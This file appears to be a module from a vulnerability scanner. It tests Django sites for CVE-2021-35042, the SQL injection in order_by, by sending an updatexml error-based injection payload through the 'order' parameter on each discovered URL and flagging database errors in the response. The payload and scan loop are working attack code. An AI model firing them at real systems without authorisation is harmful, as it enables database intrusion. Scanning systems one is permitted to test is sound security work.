#!/usr/bin/env python3
# -*- coding:utf-8 -*-

# from lib.tool import check

cve_2021_35042_payloads = [
    {'path': '{URLCONF}/?order=vuln_collection.name);select updatexml(1, concat(0x7e,(select @@basedir)),1)%23'}
    # {'path': '?order=vuln_collection.name);select updatexml(1, concat(0x7e,(select @@basedir)),1)%23'}
]

def cve_2021_35042_scan(self, clients):
    ''' 函数 QuerySet.order_by 中的 SQL 注入漏洞; 
        该漏洞需要开发者使用order_by函数, 而且可以控制查询集的输入
     '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'SQLinject',
        'vul_id': 'CVE-2021-35042',
    }
    
    urlConfList = self.get_urlconf(client, vul_info)     # * 获取Django定义的URL路径
    if not urlConfList:
        return None
    
    for payload in cve_2021_35042_payloads:
        for urlConf in urlConfList:
            path = payload['path'].format(URLCONF=urlConf)
            url = client.protocol_domain + '/'

            res = client.request(
                'get',
                url + path,
                vul_info=vul_info
            )
            if res is None:
                continue

            if ((('OperationalError' in res.text) or ('DatabaseError' in res.text)) 
                and ('Request information' in res.text)):
                results = {
                    'Target': res.request.url,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
    return None
